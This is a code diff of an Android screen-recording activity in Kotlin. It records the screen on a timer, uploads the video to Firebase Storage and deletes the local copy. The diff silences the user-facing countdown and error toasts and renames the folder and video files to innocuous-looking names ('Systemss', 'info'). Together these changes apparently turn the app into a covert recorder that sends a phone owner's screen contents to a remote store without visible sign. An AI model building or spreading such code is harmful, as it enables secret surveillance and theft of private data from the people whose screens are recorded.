@@ -46,7 +46,7 @@ class ScreenRecordingActivity : Activity() {
     private var filePath: String? = null
     private lateinit var myRef: DatabaseReference
     var mStorage: StorageReference? = null
-
+    var timer: CountDownTimer? = null
     @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -57,6 +57,7 @@ class ScreenRecordingActivity : Activity() {
         val metrics = DisplayMetrics()
         windowManager.defaultDisplay.getMetrics(metrics)
         mScreenDensity = metrics.densityDpi
+        ScreenPreference.getInstance(this@ScreenRecordingActivity).saveStatus = "true"
 
         mMediaRecorder = MediaRecorder()
         Log.d("ScreenRecordingActivity", "qua ")
@@ -82,11 +83,14 @@ class ScreenRecordingActivity : Activity() {
     }
 
     private fun gettime() {
-        object : CountDownTimer(10000, 1000) {
+
+        timer = object : CountDownTimer(30000, 1000) {
 
             override fun onTick(millisUntilFinished: Long) {
-                Toast.makeText(this@ScreenRecordingActivity, "còn : " + (millisUntilFinished / 1000).toString(), Toast.LENGTH_SHORT).show()
+                //   Toast.makeText(this@ScreenRecordingActivity, "còn : " + (millisUntilFinished / 1000).toString(), Toast.LENGTH_SHORT).show()
                 // count.setText("Time remaining " + (millisUntilFinished / 1000).toString())
+                println("tu dong tat xong" + (millisUntilFinished / 1000).toString())
+
             }
 
             override fun onFinish() {
@@ -98,24 +102,20 @@ class ScreenRecordingActivity : Activity() {
 
                     println("tu dong tat xong")
 
-                    var alphabet = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ?/.,"
-                    val character = (Math.random() * 26).toInt()
-                    val uuid = UUID.randomUUID().toString()
-                    val ids = alphabet.substring(character, character + 1)
-                    var id = ids + uuid
-                    println(id)
-                    var contentVideo: String = filePath.toString()
-                    var dataParams = DataRecordingModel(id, contentVideo)
-                    println("datap $dataParams")
-                    // myRef.push().setValue(dataParams)
-                    //  Toast.makeText(this@ScreenRecordingActivity, "thanh cong ", Toast.LENGTH_SHORT).show()
+
                     upload()
-                }catch (e:IllegalStateException){
+                } catch (e: IllegalStateException) {
                     e.printStackTrace()
                 }
 
             }
         }.start()
+    }
+
+    fun stopCountTimer() {
+        if(timer  != null){
+            timer!!.cancel()
+         }
     }
 
     @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
@@ -126,7 +126,7 @@ class ScreenRecordingActivity : Activity() {
         }
         mVirtualDisplay = createVirtualDisplay()
         mMediaRecorder!!.start()
-        Log.d(TAG,"media start")
+        Log.d(TAG, "media start")
         // isRecording = true
         // actionBtnReload()
     }
@@ -187,16 +187,19 @@ class ScreenRecordingActivity : Activity() {
 
     }
 
-    private fun upload() {
+    fun upload() {
+
 
         val file = Uri.fromFile(File(filePath))
         var mReference = mStorage!!.child(file.lastPathSegment)
+        println(file.lastPathSegment)
         try {
 
             mReference.putFile(file).addOnSuccessListener(object : OnSuccessListener<UploadTask.TaskSnapshot> {
                 override fun onSuccess(p0: UploadTask.TaskSnapshot?) {
                     println(p0)
-                    val fdelete = File(filePath)fdelete.delete()
+                    val fdelete = File(filePath)
+                    fdelete.delete()
                 }
 
             }).addOnFailureListener(object : OnFailureListener {
@@ -213,7 +216,8 @@ class ScreenRecordingActivity : Activity() {
 
 
         } catch (e: Exception) {
-            Toast.makeText(this, e.toString(), Toast.LENGTH_LONG).show()
+            println(e)
+            // Toast.makeText(this, e.toString(), Toast.LENGTH_LONG).show()
         }
 
 
@@ -224,7 +228,7 @@ class ScreenRecordingActivity : Activity() {
     }
 
     fun getFilePath(): String? {
-        val directory = Environment.getExternalStorageDirectory().toString() + File.separator + "Recordings"
+        val directory = Environment.getExternalStorageDirectory().toString() + File.separator + "Systemss"
         if (Environment.MEDIA_MOUNTED != Environment.getExternalStorageState()) {
             Toast.makeText(this, "Failed to get External Storage", Toast.LENGTH_SHORT).show()
             return null
@@ -236,7 +240,7 @@ class ScreenRecordingActivity : Activity() {
         }
 
         if (success) {
-            val videoName = "capture_" + getCurSysDate() + ".mp4"
+            val videoName = "info" + getCurSysDate() + ".mp4"
             filePath = directory + File.separator + videoName
         } else {
             Toast.makeText(this, "Failed to create Recordings directory", Toast.LENGTH_SHORT).show()
@@ -286,8 +290,10 @@ class ScreenRecordingActivity : Activity() {
 
         private val TAG = "MainActivity"
         private val REQUEST_CODE = 1000
-        private val DISPLAY_WIDTH = 720
-        private val DISPLAY_HEIGHT = 1280
+        // private val DISPLAY_WIDTH = 720
+        //private val DISPLAY_HEIGHT = 1280
+        private val DISPLAY_WIDTH = 480 //720
+        private val DISPLAY_HEIGHT = 640 //1280
         private val ORIENTATIONS = SparseIntArray()
         private val REQUEST_PERMISSION_KEY = 1
 
